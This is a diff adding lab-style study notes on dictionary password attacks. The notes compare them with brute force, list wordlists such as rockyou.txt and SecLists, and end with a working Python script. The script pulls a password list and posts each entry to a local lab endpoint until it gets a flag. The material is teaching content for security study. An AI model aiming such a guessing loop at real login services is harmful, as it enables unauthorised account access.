@@ -147,3 +147,50 @@ for pin in range(10000):
 3. The server responds with success and a flag when the correct PIN is guessed.
 
 ---
+
+# Dictionary Attacks: Overview
+
+## What is a Dictionary Attack?
+A **dictionary attack** exploits human tendencies to use predictable, simple passwords like dictionary words or common phrases. By using a precompiled list of likely passwords, attackers can efficiently crack weak passwords, making it faster than brute-forcing.
+
+## Brute Force vs. Dictionary Attack
+
+| Feature                 | Dictionary Attack                                    | Brute Force Attack                              |
+|-------------------------|------------------------------------------------------|-------------------------------------------------|
+| **Efficiency**           | Faster and more efficient                           | Time-consuming and resource-intensive           |
+| **Targeting**            | Can be tailored based on target info                | No targeting, tests all combinations            |
+| **Effectiveness**        | Works well for weak passwords                       | Works for all passwords, but slower             |
+| **Limitations**          | Ineffective against complex passwords               | Inefficient for complex passwords               |
+
+## Wordlist Creation
+- **Public Lists**: Collections of common passwords (e.g., rockyou.txt).
+- **Custom Lists**: Built from target-specific information.
+- **Pre-existing Lists**: Available with tools like SecLists.
+
+### Example Wordlists:
+| Wordlist                        | Description                                           | Source                |
+|----------------------------------|-------------------------------------------------------|-----------------------|
+| rockyou.txt                      | List of passwords from the RockYou breach.            | RockYou breach dataset|
+| 2023-200_most_used_passwords.txt | Most used passwords as of 2023                        | SecLists              |
+
+## Example: Dictionary Attack Script
+### Python Script: `dictionary-solver.py`
+```python
+import requests
+
+ip = "127.0.0.1"  # Your IP address
+port = 1234       # Your port number
+
+passwords = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/500-worst-passwords.txt").text.splitlines()
+
+for password in passwords:
+    print(f"Attempted password: {password}")
+    response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})
+    if response.ok and 'flag' in response.json():
+        print(f"Correct password: {password}")
+        print(f"Flag: {response.json()['flag']}")
+        break
+```
+
+---
+
